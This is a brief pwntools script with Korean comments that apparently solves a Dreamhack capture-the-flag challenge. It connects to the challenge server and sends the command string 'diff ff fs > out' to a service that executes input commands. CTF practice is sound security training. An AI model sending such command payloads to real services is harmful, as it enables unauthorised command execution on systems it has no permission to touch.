from pwn import *

# 1. 접속
# p = process('./chall') # 로컬
p = remote('host8.dreamhack.games', 19394)

# 2. 페이로드 전송
# ff와 fs를 비교(diff)하고 결과를 out 파일에 씀(>)
payload = "diff ff fs > out"

p.recvuntil("Input Command: \n")
p.sendline(payload)

# 3. 결과 확인
p.interactive()